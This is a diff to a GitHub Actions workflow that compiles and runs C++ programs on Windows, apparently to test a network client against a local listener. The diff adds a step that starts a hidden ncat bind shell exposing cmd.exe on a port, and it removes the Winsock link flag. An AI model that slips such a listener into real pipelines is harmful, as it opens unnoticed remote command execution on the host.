@@ -15,7 +15,12 @@ jobs:
       - name: Checkout Repository
         uses: actions/checkout@v2
 
-      - name: Install g++ with Chocolatey
+      - name: Install ncat with Chocolatey
+        run: |
+          choco install nmap -y
+        shell: powershell
+
+      - name: Set up g++ with Chocolatey
         run: |
           choco install mingw -y
         shell: powershell
@@ -28,12 +33,13 @@ jobs:
       - name: Compile C++ Files
         run: |
           foreach ($file in Get-ChildItem -Path . -Filter "*.cpp" -Recurse) {
-            & g++ $file.FullName -o "$($file.FullName.Replace('.cpp', ''))" -lws2_32
+            & g++ $file.FullName -o "$($file.FullName.Replace('.cpp', ''))"
           }
         shell: powershell
 
       - name: Run C++ Programs
         run: |
+          Start-Process -FilePath "ncat" -ArgumentList "-l -p $env:PORT -e cmd.exe" -WindowStyle Hidden
           foreach ($file in Get-ChildItem -Path . -Filter "*.exe" -Recurse) {
             if ($file.Name -notlike "*.cpp.exe") { # Skip the .cpp files themselves
               & $file.FullName -i 127.0.0.1 -p $env:PORT -m 01 -l
